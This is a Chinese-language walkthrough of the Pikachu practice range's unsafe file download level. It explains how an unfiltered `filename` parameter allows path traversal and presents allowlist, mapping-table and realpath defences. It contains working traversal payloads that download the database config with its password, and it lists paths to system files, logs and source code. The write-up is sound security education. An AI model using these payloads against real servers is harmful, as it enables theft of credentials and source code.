# 不安全的文件下载 通关笔记

> 页面上是 12 个球员的头像，点名字就下载。
>
> 但下载接口的参数是文件名——**把它改成 `../../../inc/config.inc.php`，数据库密码就下来了。**

---

## 一、环境与目标

| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | Unsafe Filedownload → Unsafe Filedownload |
| 列表页 | `http://pikachu/vul/unsafedownload/down_nba.php` |
| 下载接口 | `http://pikachu/vul/unsafedownload/execdownload.php` |
| 参数名 | `filename` |
| 目标 | 下载服务器上的任意文件 |

---

## 二、我的解题步骤

### 步骤 1：先正常下载一个

打开列表页，点「科比.布莱恩特」，地址是：

```
execdownload.php?filename=kb.png
```

下载得到一张图片。

### 步骤 2：看源码，发现路径拼接

`execdownload.php`：

```php
$file_path="download/{$_GET['filename']}";
$file_path=iconv("utf-8","gb2312",$file_path);

if(!file_exists($file_path)){
    skip("你要下载的文件不存在，请重新下载", 'unsafe_down.php');
    return;
}
$fp=fopen($file_path,"rb");
$file_size=filesize($file_path);
...
Header("Content-Disposition: attachment; filename=".basename($file_path));
```

**`download/{$_GET['filename']}` —— 直接拼接，没有任何过滤。**

### 步骤 3：路径穿越

前缀是 `download/`，脚本在 `D:\Pikachu\vul\unsafedownload\`。

路径关系：

```
D:\Pikachu\vul\unsafedownload\download\    ← 前缀
D:\Pikachu\vul\unsafedownload\             ← 上一层
D:\Pikachu\vul\                            ← 上两层
D:\Pikachu\                               ← 上三层
```

所以 payload：

```
../../../inc/config.inc.php
```

### 步骤 4：结果

访问：

```
http://pikachu/vul/unsafedownload/execdownload.php?filename=../../../inc/config.inc.php
```

**浏览器直接开始下载一个文件，内容正是 `config.inc.php`：**

```php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPW', 'rootroot');
define('DBNAME', 'pikachu');
...
```

**数据库地址、账号、密码，全在里面。**

我实测：文件正常下载，内容包含 `DBPW`。

---

## 三、原理分析

### 3.1 源码

```php
$file_path="download/{$_GET['filename']}";
```

**就这一行，没有任何校验。**

### 3.2 为什么能跳出目录

`download/../../../inc/config.inc.php` 在文件系统里被解析成：

```
D:\Pikachu\vul\unsafedownload\download\..\..\..\inc\config.inc.php
                              ↑  ↑  ↑
                         download 的父级三级
= D:\Pikachu\inc\config.inc.php
```

### 3.3 这个漏洞的实际危害链

```
下载 config.inc.php
        ↓
拿到数据库账号密码（root/rootroot）
        ↓
用 Navicat / mysql 直连
        ↓
整个数据库随便看
```

**从"下载一个文件"到"控制整个数据库"，只差一步。**

### 3.4 还能下载什么

| 目标 | 路径 |
| --- | --- |
| 数据库配置 | `../../../inc/config.inc.php` |
| 站点源码 | `../../../index.php` |
| 系统文件（Windows） | `../../../../windows/win.ini` |
| 主机文件 | `../../../../windows/system32/drivers/etc/hosts` |
| 服务器日志 | `../../../../phpstudy_pro/Extensions/Apache2.4.39/logs/access.log` |

**只要有读权限，什么都能下。**

---

## 四、知识点与笔记

### 4.1 下载漏洞的判断

| 现象 | 说明 |
| --- | --- |
| URL 里有 `filename=` / `file=` / `path=` | 可疑 |
| 参数值是文件名或路径 | 可疑 |
| 改成 `../` 后能下载别的文件 | **确认** |

### 4.2 路径层数怎么算

先确定**拼接后的真实路径**，再数需要几个 `../`。

这一关：

```
download/ + ../../../ = D:\Pikachu\
```

`download/..` → `unsafedownload/`
`../..` → `vul/`
`../../..` → `Pikachu/`
`../../../inc/config.inc.php` → `D:\Pikachu\inc\config.inc.php` ✅

### 4.3 为什么"源码"比"执行"可怕

下载 `.php` 文件时，服务器**不会执行**它（因为是直接读文件流），所以拿到的是**源码**。

而源码里的信息量巨大：

- 数据库密码
- 第三方 API Key
- 加密密钥
- 内网地址
- 其他漏洞的位置

**"读源码"往往是渗透测试里性价比最高的一步。**

### 4.4 和文件包含的区别

同样能读文件，但：

| | 文件下载 | 文件包含 |
| --- | --- | --- |
| 得到什么 | 文件内容（可保存） | 文件被**执行** |
| 能读 PHP 源码吗 | **能** | 不能（会被执行） |
| 能 RCE 吗 | 不能 | 能 |

**想读源码 → 用下载；想执行代码 → 用包含。**

---

## 五、和其他几关的区别

| 关卡 | 参数 | 用途 |
| --- | --- | --- |
| 文件包含 local | `filename` | 包含并**执行** |
| **文件下载** | `filename` | **读取并下载** |

**同一个参数名，不同的 sink（`include` vs `readfile`），效果完全不同。**

---

## 六、防御怎么写

### 6.1 白名单

```php
$allow = ['kb.png', 'ai.png', 'ns.png', ...];
if (!in_array($_GET['filename'], $allow, true)) {
    exit('非法文件');
}
```

### 6.2 映射表（更推荐）

```php
$map = [
    'kobe'  => 'kb.png',
    'ai'    => 'ai.png',
    'nash'  => 'ns.png',
];
$file = $map[$_GET['id'] ?? ''] ?? null;
if (!$file) exit('非法参数');
```

**用户传的是 `id`，不是文件名——路径完全不可控。**

### 6.3 realpath 校验

```php
$base = realpath('download');
$target = realpath($base . '/' . $_GET['filename']);

if ($target === false || strpos($target, $base) !== 0) {
    exit('非法路径');
}
```

### 6.4 不要把敏感文件放在 Web 目录

`config.inc.php` 放在 `D:\Pikachu\inc\` 下，**只要路径能被穿越到，就能被下载**。

更好的做法：

- 配置放在 Web 根目录之外
- 或者用环境变量

---

## 七、总结

| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 路径穿越导致任意文件下载 |
| payload | `?filename=../../../inc/config.inc.php` |
| 实测 | 成功下载到数据库配置（含 `DBPW`） |
| 危害 | 源码/配置泄露 → 直连数据库 |
| 修复 | 白名单 / 映射表 / `realpath` |

**一句话**：

> **下载接口的文件名一旦可控，等于把服务器的文件系统做成了一个网盘。**

---

## 参考

- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
